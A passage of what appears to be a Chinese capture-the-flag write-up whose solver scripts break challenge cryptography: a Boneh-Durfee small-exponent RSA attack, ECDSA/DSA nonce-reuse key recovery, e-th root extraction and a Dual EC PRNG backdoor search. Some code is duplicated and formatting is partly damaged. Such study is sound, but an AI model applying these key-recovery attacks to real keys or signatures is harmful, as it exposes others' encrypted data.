            xshift = x ^ ii * modulus ^ (mm - kk) * polZ(u, x, y) ^ kk
            gg.append(xshift)
    gg.sort()

    # x-shifts list of monomials
    monomials = []
    for polynomial in gg:
        for monomial in polynomial.monomials():
            if monomial not in monomials:
                monomials.append(monomial)
    monomials.sort()

    # y-shifts (selected by Herrman and May)
    for jj in range(1, tt + 1):
        for kk in range(floor(mm / tt) * jj, mm + 1):
            yshift = y ^ jj * polZ(u, x, y) ^ kk * modulus ^ (mm - kk)
            yshift = Q(yshift).lift()
            gg.append(yshift)  # substitution

    # y-shifts list of monomials
    for jj in range(1, tt + 1):
        for kk in range(floor(mm / tt) * jj, mm + 1):
            monomials.append(u ^ kk * y ^ jj)

    # construct lattice B
    nn = len(monomials)
    BB = Matrix(ZZ, nn)
    for ii in range(nn):
        BB[ii, 0] = gg[ii](0, 0, 0)
        for jj in range(1, ii + 1):
            if monomials[jj] in gg[ii].monomials():
                BB[ii, jj] = gg[ii].monomial_coefficient(monomials[jj]) * monomials[jj](UU, XX, YY)

    # Prototype to reduce the lattice
    if helpful_only:
        # automatically remove
        BB = remove_unhelpful(BB, monomials, modulus ^ mm, nn - 1)
        # reset dimension
        nn = BB.dimensions()[0]
        if nn == 0:
            print("failure")
            return 0, 0

    # check if vectors are helpful
    if debug:
        helpful_vectors(BB, modulus ^ mm)

    # check if determinant is correctly bounded
    det = BB.det()
    bound = modulus ^ (mm * nn)
    if det >= bound:
        # print("We do not have det < bound. Solutions might not be found.")
        # print("Try with highers m and t.")
        if debug:
            diff = (log(det) - log(bound)) / log(2)
            # print("size det(L) - size e^(m*n) = ", floor(diff))
        if strict:
            return -1, -1
    else:
        print("det(L) < e^(m*n) (good! If a solution exists < N^delta, it will be found)")

    # display the lattice basis
    if debug:
        matrix_overview(BB, modulus ^ mm)

    # LLL
    if debug:
        print("optimizing basis of the lattice via LLL, this can take a long time")

    BB = BB.LLL()

    if debug:
        print("LLL is done!")

    # transform vector i & j -> polynomials 1 & 2
    if debug:
        print("looking for independent vectors in the lattice")
    found_polynomials = False

    for pol1_idx in range(nn - 1):
        for pol2_idx in range(pol1_idx + 1, nn):
            # for i and j, create the two polynomials
            PR.<w,z> = PolynomialRing(ZZ)
            pol1 = pol2 = 0
            for jj in range(nn):
                pol1 += monomials[jj](w * z + 1, w, z) * BB[pol1_idx, jj] / monomials[jj](UU, XX, YY)
                pol2 += monomials[jj](w * z + 1, w, z) * BB[pol2_idx, jj] / monomials[jj](UU, XX, YY)

            # resultant
            PR.<q> = PolynomialRing(ZZ)
            rr = pol1.resultant(pol2)

            # are these good polynomials?
            if rr.is_zero() or rr.monomials() == [1]:
                continue
            else:
                # print("found them, using vectors", pol1_idx, "and", pol2_idx)
                found_polynomials = True
                break
        if found_polynomials:
            break

    if not found_polynomials:
        # print("no independant vectors could be found. This should very rarely happen...")
        return 0, 0

    rr = rr(q, q)

    # solutions
    soly = rr.roots()

    if len(soly) == 0:
        # print("Your prediction (delta) is too small")
        return 0, 0

    soly = soly[0][0]
    ss = pol1(q, soly)
    solx = ss.roots()[0][0]

    #
    return solx, soly

N = 98871082998654651904594468693622517613869880791884929588100914778964766348914919202255397776583412976785216592924335179128220634848871563960167726280836726035489482233158897362166942091133366827965811201438682117312550600943385153640907629347663140487841016782054145413246763816202055243693289693996466579973
e = 76794907644383980853714814867502708655721653834095293468287239735547303515225813724998992623067007382800348003887194379223500764768679311862929538017193078946067634221782978912767213553254272722105803768005680182504500278005295062173004098796746439445343896868825218704046110925243884449608326413259156482881
c = 13847199761503953970544410090850216804358289955503229676987212195445226107828814170983735135692611175621170777484117542057117607579344112008580933900051471041224296342157618857321522682033260246480258856376097987259016643294843196752685340912823459403703609796624411954082410762846356541101561523204985391564
delta = .275  # this means that d < N^delta
m = 8  # size of the lattice (bigger the better/slower)
t = int((1 - 2 * delta) * m)  # optimization from Herrmann and May
X = 2 * floor(N ^ delta)  # this _might_ be too much
Y = floor(N ^ (1 / 2))  # correct if p, q are ~ same size
P.<x,y> = PolynomialRing(ZZ)
A = int((N + 1) / 2)
pol = 1 + x * (A + y)

solx, soly = boneh_durfee(pol, e, m, t, X, Y)
d = int(pol(solx, soly) / e)
    #print(d)
a= power_mod(c, d, N)
print(a)
from Crypto.Util.number import *
from gmpy2 import *
import libnum

a= 24601959430759983424400804734518943158892550216065342062971649989571838687333
b= 17474742587088593627
p= 161310487790785086482919800040790794252181955976860261806376528825054571226885460699399582301663712128659872558133023114896223014064381772944582265101778076462675402208451386747128794418362648706087358197370036248544508513485401475977401111270352593919906650855268709958151310928767086591887892397722958234379
q= 1115861146902610160756777713087325311747309309771
g= 61073566757714587321114447684333928353300944355112378054603585955730395524359123615359185275743626350773632555967063692889668342544616165017003197599818881844811647270423070958521148291118914198811187731689123176313367399492561288350530256722898205674043032421874788802819858438796795768177550638273020791962
y= 23678147495254433946472657196764372220306841739888385605070426528738230369489739339976134564575544246606937803367113623097260181789372915552172469427842482448570540429192377881186772226796452797182435452490307834205012154495575570994963829345053331967442452842152258650027916313982835119514473311305158299360
(h1, r1, s1) = 535874494834828755542711401117152397489711233142, 117859946800380767356190121030392492081340616512, 26966646740134065096660259687229179143947213779
(h2, r2, s2) = 236574518096866758760287021848258048065293279716, 863199000523521111517835459866422731857447792677, 517924607931342012033031470185302567344725962419

a=24601959430759983424400804734518943158892550216065342062971649989571838687333
k = (h1*r2 - h2*r1 + b*s2*r1) * inverse(s1*r2 - a*s2*r1, q) % q
m = (s1*k - h1) * invert(r1,q) % q
flag = b'flag{' + libnum.n2s(int(m)) + b'}'
print(flag)
# 第一部分：求解hint
Hint = (12351774260625362799610458605055557349668978169954248709224197283033722650641969191523420968152180626844781310599988085824706330561484553939064653937267598659731237154241515349280967639128615784193195725170343153328247947729351564102666060302013802359410482179324719156651832539747622404434096773119440083329, 122908984806235457892414635852036332676574434804833208576141668077475917235411535511069143359388659946159724740722593181625712110278669227640297497485641848470391938438894136564046632275052354217712453952532772368082733299695485759213723305738760035793602060420638500827652832664161031815519780589765520132973, 22333858470427703056488469739724305644350178024239032705153649807913901449803887198889611591209527103787726531081225700412575986297091811550954958064297166)
c,n,leak = Hint

x = symbols('x')
f = x*(leak-x) - n
q,p = solve(f,x)

# About 3 seconds to run
def AMM(o, r, q):
    start = time.time()
    print('n----------------------------------------------------------------------------------')
    print('Start to run Adleman-Manders-Miller Root Extraction Method')
    print('Try to find one {:#x}th root of {} modulo {}'.format(r, o, q))
    g = GF(q)
    o = g(o)
    p = g(random.randint(1, q))
    while p ^ ((q - 1) // r) == 1:
        p = g(random.randint(1, q))
    print('[+] Find p:{}'.format(p))
    t = 0
    s = q - 1
    while s % r == 0:
        t += 1
        s = s // r
    print('[+] Find s:{}, t:{}'.format(s, t))
    k = 1
    while (k * s + 1) % r != 0:
        k += 1
    alp = (k * s + 1) // r
    print('[+] Find alp:{}'.format(alp))
    a = p ^ (r ** (t - 1) * s)
    b = o ^ (r * alp - 1)
    c = p ^ s
    h = 1
    for i in range(1, t):
        d = b ^ (r ^ (t - 1 - i))
        if d == 1:
            j = 0
        else:
            print('[+] Calculating DLP...')
            j = - discrete_log(d, a)
            print('[+] Finish DLP...')
        b = b * (c ^ r) ^ j
        h = h * c ^ j
        c = c ^ r
    result = o ^ alp * h
    end = time.time()
    print("Finished in {} seconds.".format(end - start))
    print('Find one solution: {}'.format(result))
    return result

def onemod(p, r):
    t = random.randint(2, p)
    while pow(t, (p - 1) // r, p) == 1:
        t = random.randint(2, p)
    return pow(t, (p - 1) // r, p)

def solution(p, root, e):
    while True:
        g = onemod(p, e)
        may = []
        for i in tqdm(range(e)):
            may.append(root * pow(g, i, p) % p)
        if len(may) == len(set(may)):
            return may

def solve_in_subset(ep, p):
    cp = int(pow(c, inverse(int(e // ep), p - 1), p))
    com_factors = []
    while GCD(ep, p - 1) != 1:
        com_factors.append(GCD(ep, p - 1))
        ep //= GCD(ep, p - 1)
    com_factors.sort()

    cps = [cp]
    for factor in com_factors:
        mps = []
        for cp in cps:
            mp = AMM(cp, factor, p)
            mps += solution(p, mp, factor)
        cps = mps
    for each in cps:
        assert pow(each, e, p) == c % p
    return cps

p = 12505332663944649833363705782585622154783535731134356705062751557012581621705445087053420721597737291635565932107641867441872588740363132435706587458477029
q = 9828525806483053223124763957138683489566642293104676000090898250901319828098442111836190869611789812152160598973583832970703397556728679115248370605820137
e = 16542764952
c = 12351774260625362799610458605055557349668978169954248709224197283033722650641969191523420968152180626844781310599988085824706330561484553939064653937267598659731237154241515349280967639128615784193195725170343153328247947729351564102666060302013802359410482179324719156651832539747622404434096773119440083329

ep = 984
eq = 24
m_p = solve_in_subset(ep, p)
m_q = solve_in_subset(eq, q)

start = time.time()
print('Start CRT...')
for mpp in m_p:
    for mqq in m_q:
        solution = CRT_list([int(mpp), int(mqq)], [p, q])
        if solution < 2 ^ 800:  # Always the bit_length of flag is less than 800
            print(long_to_bytes(solution))

end = time.time()
print("Finished in {} seconds.".format(end - start))
得到hint = b"Anything greater than 2^15 is really that's too big"
K = (s1 -s2)^-1 * (z1 -z2) mod n
from hashlib import *
from Crypto.Util.number import *
import ecdsa
from tqdm import tqdm

curves = ecdsa.curves
NIST256p = curves.NIST256p
NIST384p = curves.NIST384p

p_NIST256p = NIST256p.curve.p()
a_NIST256p = NIST256p.curve.a()
b_NIST256p = NIST256p.curve.b()
g_NIST256p = (NIST256p.generator.x(), NIST256p.generator.y())

p_NIST384p = NIST384p.curve.p()
a_NIST384p = NIST384p.curve.a()
b_NIST384p = NIST384p.curve.b()
g_NIST384p = (NIST384p.generator.x(), NIST384p.generator.y())

E_NIST256p = EllipticCurve(GF(p_NIST256p), [a_NIST256p, b_NIST256p])
E_NIST384p = EllipticCurve(GF(p_NIST384p), [a_NIST384p, b_NIST384p])

G_NIST256p = E_NIST256p(g_NIST256p)
G_NIST384p = E_NIST384p(g_NIST384p)

q = 39402006196394479212279040100143613805079739270465446667946905279627659399113263569398956308152294913554433653942643
m1 = b'A typical Dual ec prng vulnerability applied to NSA, you can find its source in past papers.'
m2 = b'Hope you have learned a good foundation of ECDSA, it can help you better answer and understand this problem.'
z1 = int(sha256(m1).hexdigest(), 16)
z2 = int(sha256(m2).hexdigest(), 16)

f = open('outpute.txt', 'r')
Data = f.read().split('-------------------------------------------------------------------n')

# 第一部分：求解hint
Hint = (12351774260625362799610458605055557349668978169954248709224197283033722650641969191523420968152180626844781310599988085824706330561484553939064653937267598659731237154241515349280967639128615784193195725170343153328247947729351564102666060302013802359410482179324719156651832539747622404434096773119440083329, 122908984806235457892414635852036332676574434804833208576141668077475917235411535511069143359388659946159724740722593181625712110278669227640297497485641848470391938438894136564046632275052354217712453952532772368082733299695485759213723305738760035793602060420638500827652832664161031815519780589765520132973, 22333858470427703056488469739724305644350178024239032705153649807913901449803887198889611591209527103787726531081225700412575986297091811550954958064297166)
c,n,leak = Hint

x = symbols('x')
f = x*(leak-x) - n
q,p = solve(f,x)

# About 3 seconds to run
def AMM(o, r, q):
    start = time.time()
    print('n----------------------------------------------------------------------------------')
    print('Start to run Adleman-Manders-Miller Root Extraction Method')
    print('Try to find one {:#x}th root of {} modulo {}'.format(r, o, q))
    g = GF(q)
    o = g(o)
    p = g(random.randint(1, q))
    while p ^ ((q - 1) // r) == 1:
        p = g(random.randint(1, q))
    print('[+] Find p:{}'.format(p))
    t = 0
    s = q - 1
    while s % r == 0:
        t += 1
        s = s // r
    print('[+] Find s:{}, t:{}'.format(s, t))
    k = 1
    while (k * s + 1) % r != 0:
        k += 1
    alp = (k * s + 1) // r
    print('[+] Find alp:{}'.format(alp))
    a = p ^ (r ** (t - 1) * s)
    b = o ^ (r * alp - 1)
    c = p ^ s
    h = 1
    for i in range(1, t):
        d = b ^ (r ^ (t - 1 - i))
        if d == 1:
            j = 0
        else:
            print('[+] Calculating DLP...')
            j = - discrete_log(d, a)
            print('[+] Finish DLP...')
        b = b * (c ^ r) ^ j
        h = h * c ^ j
        c = c ^ r
    result = o ^ alp * h
    end = time.time()
    print("Finished in {} seconds.".format(end - start))
    print('Find one solution: {}'.format(result))
    return result

def onemod(p, r):
    t = random.randint(2, p)
    while pow(t, (p - 1) // r, p) == 1:
        t = random.randint(2, p)
    return pow(t, (p - 1) // r, p)

def solution(p, root, e):
    while True:
        g = onemod(p, e)
        may = []
        for i in tqdm(range(e)):
            may.append(root * pow(g, i, p) % p)
        if len(may) == len(set(may)):
            return may

def solve_in_subset(ep, p):
    cp = int(pow(c, inverse(int(e // ep), p - 1), p))
    com_factors = []
    while GCD(ep, p - 1) != 1:
        com_factors.append(GCD(ep, p - 1))
        ep //= GCD(ep, p - 1)
    com_factors.sort()

    cps = [cp]
    for factor in com_factors:
        mps = []
        for cp in cps:
            mp = AMM(cp, factor, p)
            mps += solution(p, mp, factor)
        cps = mps
    for each in cps:
        assert pow(each, e, p) == c % p
    return cps

p = 12505332663944649833363705782585622154783535731134356705062751557012581621705445087053420721597737291635565932107641867441872588740363132435706587458477029
q = 9828525806483053223124763957138683489566642293104676000090898250901319828098442111836190869611789812152160598973583832970703397556728679115248370605820137
e = 16542764952
c = 12351774260625362799610458605055557349668978169954248709224197283033722650641969191523420968152180626844781310599988085824706330561484553939064653937267598659731237154241515349280967639128615784193195725170343153328247947729351564102666060302013802359410482179324719156651832539747622404434096773119440083329

ep = 984
eq = 24
m_p = solve_in_subset(ep, p)
m_q = solve_in_subset(eq, q)

start = time.time()
print('Start CRT...')
for mpp in m_p:
    for mqq in m_q:
        solution = CRT_list([int(mpp), int(mqq)], [p, q])
        if solution < 2 ^ 800:  # Always the bit_length of flag is less than 800
            print(long_to_bytes(solution))

end = time.time()
print("Finished in {} seconds.".format(end - start))

# b"Anything greater than 2^15 is really that's too big"
# b"Anything greater than 2^15 is really that's too big"
# Finished in 0.3607470989227295 seconds.

#第二部分：爆破Dual_prng
for j in tqdm(range(250)):
    #     print(f'Start process {j}:')
    # 数据处理
    data = Data[j].split('n')
    C = eval(data[0][4:])
    Hint = eval(data[1][7:])
    pub_key_data = data[2][10:].split(',')
    pub_key = (eval(pub_key_data[0][5:-1]), eval(pub_key_data[1][5:-2]))
    P = eval(data[3][4:])
    Q = eval(data[4][4:])
    sign1 = eval(data[5][8:])
    sign2 = eval(data[6][8:])
    into_secret_data = data[7][14:].split(':')
    into_secret = (eval(into_secret_data[0][1:]), eval(into_secret_data[1]))
    # print(into_secret)

    k = inverse(sign1[1] - sign2[1], q) * (z1 - z2) % q

    pri_key = (k * sign1[1] - z1) * inverse(sign1[0], q) % q
    #     print(pri_key, int(pri_key).bit_length())
    P = E_NIST256p(P)
    Q = E_NIST256p(Q)
    P_Q_number = 0
    for i1 in range(1, 2 ^ 15):
        try:
            if i1 * Q == P:
                P_Q_number = i1
                print(i1)
                break
        
except:
            pass
    if P_Q_number == 0:
        #         print(f'The {j} is failed')
        continue

    print('We have find the right P_Q_number')
    num, Key = 0, 0
    for i in tqdm(range(1, 2 ^ 6)):
        T = (i << 250) + pri_key
        try:
            state = int(((E_NIST256p.lift_x(T)) * P_Q_number).xy()[0])
            out0 = 0
            for i1 in range(2):
                t = int((state * Q).xy()[0])
                out0 = (out0 << 250) + t % (2 ** 250)
                state = int((state * P).xy()[0])

            out = 0
            for i1 in range(2):
                t = int((state * Q).xy()[0])
                out = (out << 250) + t % (2 ** 250)
                state = int((state * P).xy()[0])

            out = long_to_bytes(out % (2 ^ 384))
            k1 = int(sha256(out).hexdigest(), 16)
            if k1 == k:
                Key = out0 % (2 ^ 384)
                num = T
                print('Key = ', Key)
                break
        
except:
            pass

    C = int(C)
    into_secret = E_NIST384p(into_secret[0], into_secret[1])
    secret = inverse(Key, q) * into_secret
    secret = secret.xy()[0]
    flag = long_to_bytes(int(secret) ^^ int(C))
    print('We have find the right flag!')
    print(f'flag : {flag}')
    break
Please firstly pay attention to the file named as "task.py".
The real flag is a little strange.
However, there is no need to be messy in your mind just because of the "appearance" of the flag.
Just be self-confident!
from Crypto.Util.number import *
import initialize
import train
import valid
import test
import rec
from secret import message, flag_point

flag = b"flag{" + long_to_bytes(message) + long_to_bytes(flag_point) + b".}"

p = getPrime(512)
q = getPrime(512)
n = p * q
print("The significant parameter n: %s" % hex(n))
phi0 = (p - 1) * (q - 1)
r = rec.rec(p, q)
print("The unique parameter r: %s" % hex(r))

parameters = initialize.initialize(p, q)
wild_phi = parameters[0]
wild_e = parameters[1]
print("------")

print("Parameters are initialized to: n  phi:%sn" % hex(wild_phi), " e:%s" % hex(wild_e))
print("But they are wild and crazy!")
print("We have to give them a lesson!")
print("------")

parameters = train.train(wild_phi, wild_e, n, r, phi0)
trained_phi = parameters[0]
trained_e = parameters[1]
print("Parameters are trained to: n  phi:%sn" % hex(trained_phi), " e:%s" % hex(trained_e))
print("After training, the two naughty parameters are more and more normal.")
print("It's closer to your target!")
print("------")

parameters = valid.valid(trained_phi, trained_e, n)
y_valid = parameters[0]
print("The encrypted output in validation set is %s" % hex(y_valid))
print("After validation, the model is more and more stable.")
print("To test the real flag!")
print("------")

parameters = test.test(trained_phi, trained_e, n)
y_hat_cipher1 = parameters[0]
y_hat_cipher2 = parameters[1]
print("The final output is n%s" % hex(y_hat_cipher1), "n%s" % hex(y_hat_cipher2))
print("------")
from Crypto.Util.number import *

#已知量n、trained_phi、trained_e
n = int("0x81c5f040bfaea676120cd62c36ba7afb303561504bbf8609afa3da60fb6202ca875b0bd2a06143ebcd16fa615557ff159d97909160d68e1938b3ecaf57709b3d2698476b6dd203811b6a2ec6a6e2a7e213ab719bcd3ab49bb864b10e9c78ea3f501c0e2213dfe431043bb6f0cc2e8d77bfb43869b843af1a99ae81b87811e101", 16)
trained_phi = int("0x81c5f040bfaea676120cd62c36ba7afb303561504bbf8609afa3da60fb6202ca875b0bd2a06143ebcd16fa615557ff159d97909160d68e1938b3ecaf57709b3bb712fdcba325655f111918472d4353a66854ccda50b63a1047278c15a4b39cde898d054db87092958c7c05f8fa566dcd969b1ff4b7d1935c375a4af3bfc341b0", 16)
trained_e = int("0x2c22193ad9abcca2f67552fc76dd07b3ef883f3d755c95119cdf82bb6a07c970fd37e582bb49250d8efaa29b8a59c82059165c654206a9d7261f6b45a90dc69", 16)

#求未知量d、m1、m2
d = inverse(trained_e, trained_phi)
c1 = int("0x29289e3d9275147b885b5061637564cbee3e4d9f48e52694e594f020e49da9b24d9246b2437fb2221fa86ca1a277f3fdd7ab5cad4738a02b66d47703ef816844a84c6c209c8251e8961c9ba2c791649e022627f86932d9700c3b1dc086e8b2747d0a5604955387a935464d3866dd4100b2f3d57603c728761d1d8ef7fdbdcbee", 16)
c2 = int("0x2b0059f88454e0e36269c809b5d5b6b28e5bab3c87b20f9e55635239331100a0a582241e7a385034698b61ebf24b519e868617ff67974cc907cc61be38755737f9a6dbeb7890ff55550b1af1ecf635112fcaaa8b07a3972b3c6728cbcf2a3973a4d7bd92affec7e065e0ae83cd36858e6d983785a3668a8b82709d78a69796af", 16)
m1 = pow(c1, d, n)
m2 = pow(c2, d, n)

#得出flag
flag = b"flag{" + long_to_bytes(m1) + long_to_bytes(m2) + b".}"
print(flag)
from Crypto.Util.number import *

#已知量n、r、wild_phi、loss
n = int("0x81c5f040bfaea676120cd62c36ba7afb303561504bbf8609afa3da60fb6202ca875b0bd2a06143ebcd16fa615557ff159d97909160d68e1938b3ecaf57709b3d2698476b6dd203811b6a2ec6a6e2a7e213ab719bcd3ab49bb864b10e9c78ea3f501c0e2213dfe431043bb6f0cc2e8d77bfb43869b843af1a99ae81b87811e101", 16)
r = int("0x4f37fe985d13ffde9867fa0063f68dea79196408b1404eadf03ea59297d629c2183a4a6a6647b6c4c99dd43bae8c4fa4691a608d20170fd42b18aef7efb3ae01cd3", 16)
wild_phi = int("0x81c5f040bfaea676120cd62c36ba7afb303561504bbf8609afa3da60fb6202ca875b0bd2a06143ebcd16fa615557ff159d97909160d68e1938b3ecaf57709648d78eb17edb46dda768a97d57e6bd1c48657393b7c0d9c574c38cc0a3545ce7d209ade33b8ac6b31a41fe9f4ed62b4ddd7b99859b74915f2031dd2f5f0499a2f8", 16)
loss = int("-0x5144bdad7cc24f5348c5752dda0ff5fa7d72e36370d5af55eb6f590ac0764b843a06ee1a4651b8f3a6c878df56f1678454e58eaf0ede9a1eb0503dce6a1303b69e33bbaad112abb051a28d51a9fee629e89400a338bd02998568d044852f11e05572fc4a0ddacdf7342048295a4025394e77e973621a77ea5bbdb06af2cb72b2f8298e2cd16736454fd066d3d96a4f77cd094cd783ead17024de981df7ade84aa8c282b1ec6f8ec6ec4752727387ef637ba2a4eed8f83c77d5db14d297de8098", 16)

#求未知量phi
phi = (2023*n - wild_phi + n*r + 2023 + 2024) // 2024 + loss

#求未知量d、m1、m2
e = int("0x2c22193ad9abcca2f67552fc76dd07b3ef883f3d755c95119cdf82bb6a07c970fd37e582bb49250d8efaa29b8a59c82059165c654206a9d7261f6b45a90dc69", 16)
d = inverse(e, phi)
c1 = int("0x29289e3d9275147b885b5061637564cbee3e4d9f48e52694e594f020e49da9b24d9246b2437fb2221fa86ca1a277f3fdd7ab5cad4738a02b66d47703ef816844a84c6c209c8251e8961c9ba2c791649e022627f86932d9700c3b1dc086e8b2747d0a5604955387a935464d3866dd4100b2f3d57603c728761d1d8ef7fdbdcbee", 16)
c2 = int("0x2b0059f88454e0e36269c809b5d5b6b28e5bab3c87b20f9e55635239331100a0a582241e7a385034698b61ebf24b519e868617ff67974cc907cc61be38755737f9a6dbeb7890ff55550b1af1ecf635112fcaaa8b07a3972b3c6728cbcf2a3973a4d7bd92affec7e065e0ae83cd36858e6d983785a3668a8b82709d78a69796af", 16)
m1 = pow(c1, d, n)
m2 = pow(c2, d, n)

#得出flag
flag = b"flag{" + long_to_bytes(m1) + long_to_bytes(m2) + b".}"
print(flag)
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/01/7-1706607635.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/01/5-1706607636.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/01/4-1706607637.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/01/2-1706607639.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/01/4-1706607641.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/01/6-1706607642.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/01/9-1706607642.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/01/10-1706607644.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/01/9-1706607646.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/01/7-1706607646.png)